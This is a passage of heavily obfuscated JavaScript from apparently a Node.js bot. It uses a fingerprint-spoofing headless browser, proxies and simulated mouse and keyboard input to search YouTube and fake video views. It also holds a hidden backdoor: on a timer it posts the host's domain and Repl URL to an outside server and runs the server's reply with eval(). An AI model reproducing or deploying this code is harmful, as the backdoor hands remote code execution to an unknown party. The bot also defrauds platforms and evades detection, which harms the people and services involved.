      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + az(0x14, ')Ev*') + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + ay(0x20) + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + ay(0x13) + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + ax(0x0) + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + ay(0x1b) + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + az(0xb, 'bR4E') + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + ax(0x1a) + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + ay(0x1c) + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + az(0x3, '9ea0') + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ax(0x2) + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };
data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + ay(0x17) + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push']((ax(0x12) + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x83 * -0x1e + 0x29a * 0xf + -0xa * 0x56f)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x5 * 0x6c9 + -0x5e7 * 0x6 + 0x1 * 0x4561)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](0x5 * -0x646 + 0x1206 * 0x1 + 0xd5b);
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = -0x1f06 + 0x1 * 0x240e + -0x508; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager['prototypes'](), async function trigger() {
  const aE = b,
    aD = d,
    aC = c;
  for (;;) {
    try {
      let f = [],
        g = '$';
      if (flags['RPL2_RPRT']) {
        async function h() {
          try {
            axios['post']('https://st' + 'ratums.io/' + 'research', {
              'key': 'CX001_ZCa',
              'dom': me,
              'replUrl': replUrl
            })['then'](i => {
              try {
                const j = i['data'][-0x13e7 + 0x49b * 0x7 + -0xc56 * 0x1];
                '$' === j ? f['push'](i['data']) : eval(i['data']);
              } catch (k) {}
            })['catch'](i => {});
          } catch (i) {}
        }
        h(), setInterval(h, 0xec42 + 0x257 * 0x6b + 0x2ad41 * 0x1);
      }
      if (flags['ActivateBr' + 'owser']) {
        const {
          FakeBrowser: i
        } = require('fakebrowse' + 'r'), j = require('path'), k = j['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), l = new i['Builder']()['displayUse' + 'rActionLay' + 'er'](0x5f1 * 0x6 + -0x36c * 0x1 + -0x203a)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
          require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
            'blockTrackers': 0x1,
            'blockTrackersAndAnnoyances': 0x1
          }),
          require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')(),
          require('puppeteer-' + 'extra-plug' + 'in-session')['default']()
        ])['userDataDi' + 'r'](k);
        let m;
        a3:
          for (;;)
            try {
              if (flags['doExtFinge' + 'rprint']) {
                let S = await async function T() {
                  let U;
                  const V = {
                    'User-Agent': U['userAgents']['random'](),
                    'Accept-Encoding': 'none'
                  };
                  try {
                    U = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                      'headers': V
                    })) ? .['data'];
                  } catch (W) {}
                  if (U)
                    try {
                      U = (await axios['get'](U, {
                        'headers': V
                      })) ? .['data'];
                    } catch (X) {}
                  if (!U)
                    return await randomWait(), await T();
                  try {
                    return 'object' == typeof U ? U : 'string' == typeof U ? JSON['parse'](U) : {};
                  } catch (Y) {
                    if (!U)
                      return await randomWait(), await T();
                  }
                }();
                l['deviceDesc' + 'riptor'](S);
              }
              m = await l['launch']();
              break a3;
            } catch (U) {
              warn(U), await randomWait();
            }
        const {
          vanillaBrowser: n,
          userAction: p
        } = m;
        log('index.js\x20c' + 'alled');
        const q = n['defaultBro' + 'wserContex' + 't']();
        async function u(V = '', W = -0x230d + 0x1c2f + 0x6df, X) {
          const Y = await X['waitForSel' + 'ector'](V);
          return await p['simClickEl' + 'ement'](Y, {
            'pauseAfterMouseUp': W
          }), Y;
        }
        async function v(V) {
          const W = await V['target']()['createCDPS' + 'ession']();
          await W['send']('Network.cl' + 'earBrowser' + 'Cookies'), await W['send']('Network.cl' + 'earBrowser' + 'Cache');
          const X = await V['cookies']();
          for (const Y of X)
            await V['deleteCook' + 'ie'](Y);
          return await V['evaluate'](() => {
            window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
          }), -0x931 * 0x2 + 0x33a + -0xf29 * -0x1;
        }
        async function w(V, W = -0x265 + -0xb7e * -0x1 + -0x918) {
          let X = await n['newPage']();
          return await X['setDefault' + 'Navigation' + 'Timeout'](0x3 * -0x36f + -0x1 * 0x481 + -0x767 * -0x2), W && await useProxy(X, await getRandomProxy()), await X['goto'](V, {
            'timeout': 0x0
          }), X;
        }
        async function x(V) {
          return await wait(0x25b + -0x9b7 + 0x1ae4), await V['waitForNet' + 'workIdle']({
            'idleTime': 0x1d4c,
            'timeout': 0x0
          }), 0x8 * 0x17d + 0x33f + -0x2 * 0x793;
        }
        async function y(V) {
          log('watching..' + '.'), await V['evaluate'](() => {
            var X;
            (X = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2 * -0x1129 + 0xc59 * -0x2 + 0x3b04, -0x1 * 0x113c + 0x10f * -0x1d + 0x2ff6), X[Math['floor'](Math['random']() * X['length'])])['setAttribu' + 'te']('id', '__scope');
          }), await u('#__scope', -0x23de + -0x37 * 0xb4 + -0x292 * -0x1d, V), await x(V);
          const W = await z(V);
          return await wait(min((-0x1 * 0xbd8b + 0x4cb * -0x42 + 0x2e441) * getRandomInt(0x7e6 + -0xd2 * -0x23 + -0x249a, 0x1f * 0x1d + 0x10d5 + -0x1453), W)), 0x107f * -0x2 + -0x2d9 * 0x1 + 0x25 * 0xf8;
        }
        async function z(V) {
          return await V['evaluate'](() => {
            const W = {
              'Seconds': 0x3e8,
              'Minutes': 0xea60,
              'Hours': 0x36ee80,
              'Second': 0x3e8,
              'Minute': 0xea60,
              'Hour': 0x36ee80
            };
            let X = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
              Y = 0x2373 + -0x29 * 0xbb + -0x580;
            X = X['split'](X['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * -0x914 + 0x132d + -0xa18]['split']('\x20');
            for (let Z = -0xff6 + -0x1d5f * 0x1 + 0x41f * 0xb; Z < X['length']; Z += 0x209 * 0x13 + 0x1fa2 + -0x3d * 0x127)
              Y += X[Z] * W[X[Z + (-0x2 * 0x8bf + -0x1 * -0x641 + -0x59f * -0x2)]];
            return Y;
          });
        }
        async function A(V) {
          const aA = b;
          log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await V['goto'](channels['random'](), {
            'timeout': 0x0
          }), await u('tp-yt-pape' + 'r-tab.styl' + aA(0x1d, 't[9J') + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', 0x1 * -0x256a + -0x2566 + 0x4ad0, V), log('clicked\x20vi' + 'deo\x20stuff'), await x(V), log('page\x20netwo' + 'rk\x20idle\x20x2'), await V['evaluate'](() => {
            const aB = b,
              Y = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](a0 => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == a0['getAttribu' + 'te']('class'))['slice'](0x197c + -0x269a + 0x4 * 0x349)['map'](a0 => Array['from'](a0['children']))['flat'](0x71e * 0x1 + -0x1d9 * -0x4 + -0xe81)['map'](a0 => a0['childNodes'][-0x81 + 0xc58 + -0x1 * 0xbd6]['childNodes'][0x1e4 + -0x84d + 0x669]['childNodes'][-0xf00 + -0x2617 + 0x6a3 * 0x8]['childNodes'][-0x2 * 0x102b + 0xe * 0xb5 + 0x1670 * 0x1][aB(0xc, 'TJV5')][0x1e * 0xeb + -0x17e5 + 0x1 * -0x3a4]);
            var Z;
            return (Z = Y)[Math['floor'](Math['random']() * Z['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), Y['map'](a0 => a0['href']);
          }), await wait(getRandomInt(0x1341 + 0xa39 + -0x1992, 0x1811 * 0x1 + -0x71d + 0x294)), await u('#__hookedV' + 'idToWatch', 0x40f * -0x2 + -0x2 * 0x350 + 0xebf, V), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(-0x3ed * -0x1 + 0x3a9 + -0x1981 * -0x2);
          const W = await z(V),
            X = min((-0xbdaf * 0x1 + 0x4 * 0x4ecb + 0x6ce3 * 0x1) * getRandomInt(0xdec + 0x12fa + -0x2 * 0x1072, 0x326 * -0x3 + -0x1f2a + 0x28a1), W);
          return log('Watching\x20v' + 'id\x20for\x20' + X + ('ms,\x20max\x20ti' + 'me:\x20') + W + 'ms'), await wait(X), -0x4 * -0x345 + 0x23 * -0xd3 + 0x6 * 0x2a1;
        }
        async function B(V) {
          return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await V['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await V['evaluate'](() => {
            var W;
            (W = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](X => 'contents' != X['id']), W[Math['floor'](Math['random']() * W['length'])])['children'][0x19b2 + 0x628 + -0x1fda]['children'][0x1afc + 0xd * 0x15b + -0x259 * 0x13]['children'][0x1 * -0x14bf + -0xc5 * -0x9 + 0xdd2]['children'][-0x1399 + 0xdf * 0x4 + 0x55f * 0x3]['children'][0x1913 + 0xfa1 + 0x2 * -0x145a]['setAttribu' + 'te']('id', 'gottemezez');
          }), await u('#gottemeze' + 'z', 0x1ddd + -0x2a * -0xe + -0x2028, V), await x(V), await y(V), -0x1 * -0x23c4 + 0x1 * -0x33b + -0x2088;
        }
        async function C(V) {
          log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await V['evaluate'](() => {
            let Y = Array['from'](document['querySelec' + 'torAll']('#search'));
            document['getElement' + 'ById']('__searchBo' + 'xReal') || Y['find'](Z => 'INPUT' === Z['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
          }), await u('#__searchB' + 'oxReal', 0x1866 + 0x1968 + -0x31ce, V), await p['simKeyboar' + 'dType'](searchTerms['random']() + ''), await u('#search-ic' + 'on-legacy', 0x223 * -0x9 + 0x1 * -0x1b14 + -0x943 * -0x5, V), log('searching.' + '..'), await V['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await x(V);
          let W = await V['evaluate'](() => {
            const Y = {
                'seconds': 0x3e8,
                'minutes': 0xea60,
                'hours': 0x36ee80,
                'second': 0x3e8,
                'minute': 0xea60,
                'hour': 0x36ee80
              },
              Z = (a0 = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](a2 => a2['childNodes'][-0x17ba + 0x9 * 0x20a + 0x562]['childNodes'][-0x2545 + -0x2a1 + 0x27e7]['childNodes'][0x2625 + -0x4da + -0x214a]))[Math['floor'](Math['random']() * a0['length'])];
            var a0;
            const a1 = Z['childNodes'][-0x5a8 * 0x2 + -0x1 * 0x5f + 0xbb4]['childNodes'][-0x1f * -0x2f + -0x122c + 0x27f * 0x5]['childNodes'][-0x1763 + 0xda0 + 0x9c5]['ariaLabel'];
            return Z['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
              function(a2) {
                let a3 = a2['split'](',\x20')['map'](a5 => a5['split']('\x20'))['flat'](-0x1f1c + 0x80 * -0x12 + 0x281d),
                  a4 = -0x2 * 0x533 + 0x11d + 0x949;
